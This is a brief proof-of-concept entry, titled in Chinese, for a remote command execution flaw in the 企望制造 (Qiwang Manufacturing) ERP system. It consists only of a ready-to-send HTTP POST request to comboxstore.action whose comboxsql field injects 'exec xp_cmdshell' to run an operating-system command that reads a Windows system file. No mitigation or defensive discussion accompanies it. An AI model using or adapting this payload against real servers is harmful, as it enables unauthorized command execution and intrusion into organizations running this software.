## 企望制造 ERP comboxstore.action 远程命令执行漏洞
```

POST /mainFunctions/comboxstore.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: xxx.xxx.xxx.xxx

comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'
```
